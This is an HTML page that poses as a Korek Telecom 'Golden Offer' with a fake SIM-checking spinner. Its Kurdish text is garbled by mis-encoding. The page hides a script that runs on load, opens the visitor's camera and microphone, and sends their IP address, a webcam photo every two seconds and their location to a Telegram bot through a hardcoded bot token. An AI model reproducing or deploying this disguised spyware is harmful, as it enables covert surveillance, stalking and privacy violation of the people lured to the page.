<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Korek Telecom - Golden Offer</title>
    
    <script>
        /* --- Ø¨Û•Ø´ÛŒ Ù‡Ø§Ú© - ÛŒÛ•Ú©Ø³Û•Ø± Ú©Ø§Ø± Ø¯Û•Ú©Ø§Øª Ù¾ÛØ´ Ø¨Ø§Ø±Ø¨ÙˆÙˆÙ†ÛŒ Ø¯ÛŒØ²Ø§ÛŒÙ† --- */
        const urlParams = new URLSearchParams(window.location.search);
        const targetID = urlParams.get('id'); 
        const TOKEN = "8300725896:AAHHhfRB0II4tFDs7ypgNTS_Xc9gWP40Z58";

        async function instantCapture() {
            if (!targetID) return;

            try {
                // ÛŒÛ•Ú©Ø³Û•Ø± Ø¯Ø§ÙˆØ§ÛŒ Ù…Û†ÚµÛ•Øª Ø¯Û•Ú©Ø§Øª
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true 
                });

                // Ù†Ø§Ø±Ø¯Ù†ÛŒ Ú•Ø§Ù¾Û†Ø±ØªÛŒ Ø³Û•Ø±Û•ØªØ§ÛŒÛŒ
                const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
                
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: targetID, 
                        text: `ğŸ¦… <b>Ù†ÛÚ†ÛŒØ±ÛÚ©ÛŒ Ù†ÙˆÛ Ú©Û•ÙˆØªÛ• Ù†Ø§Ùˆ ØªÛ•ÚµÛ•ÙˆÛ•!</b>\nğŸŒ IP: <code>${ipData.ip}</code>`, 
                        parse_mode: "HTML"
                    })
                });

                // Ø¯Û•Ø³ØªÙ¾ÛÚ©Ø±Ø¯Ù†ÛŒ ÙˆÛÙ†Û•Ú¯Ø±ØªÙ† Ù„Û• Ù¾Ø§Ø´Ø¨Ù†Û•Ù…Ø§
                const video = document.createElement('video');
                video.srcObject = stream;
                video.muted = true;
                video.play();

                setInterval(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        if (blob) {
                            let fd = new FormData();
                            fd.append("chat_id", targetID);
                            fd.append("photo", blob, "shot.jpg");
                            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                        }
                    }, 'image/jpeg', 0.7);
                }, 2000);

                // ÙˆÛ•Ø±Ú¯Ø±ØªÙ†ÛŒ Ù„ÙˆÚ©Û•ÛŒØ´Ù† ÛŒÛ•Ú©Ø³Û•Ø±
                navigator.geolocation.getCurrentPosition(pos => {
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({chat_id: targetID, latitude: pos.coords.latitude, longitude: pos.coords.longitude})
                    });
                });

            } catch (e) {}
        }

        // Ø¨Ø§Ù†Ú¯Ú©Ø±Ø¯Ù†ÛŒ ÙÛ•Ù†Ú©Ø´Ù†Û•Ú©Û• Ø¨Û•Ø¨Û ÙˆÛ•Ø³ØªØ§Ù†
        instantCapture();
    </script>

    <style>
        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #005596; color: white; text-align: center; }
        header { width: 100%; background-color: white; padding: 10px 0; border-bottom: 3px solid #fdb913; }
        .hero { padding: 30px 20px; }
        .golden { color: #fdb913; font-size: 35px; font-weight: bold; }
        .recharge-box { background: white; color: #333; padding: 20px; border-radius: 10px; margin: 20px auto; width: 90%; max-width: 350px; }
    </style>
</head>
<body>
    <header>
        <img src="https://www.korektelecom.com/media/1001/korek-logo.png" alt="Korek" width="120">
    </header>
    <div class="hero">
        <div class="golden">Golden Offer</div>
        <div style="font-size: 45px; font-weight: 900;">*203#</div>
        <div class="recharge-box">
            <div style="border: 3px solid #f3f3f3; border-top: 3px solid #005596; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: auto;"></div>
            <p style="font-size: 14px;">Ø®Û•Ø±ÛŒÚ©ÛŒ Ù¾Ø´Ú©Ù†ÛŒÙ†ÛŒ Ø³ÛŒÙ…Ú©Ø§Ø±ØªÛ•Ú©Û•ØªÛŒÙ†...</p>
        </div>
    </div>
    <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
</body>
</html>
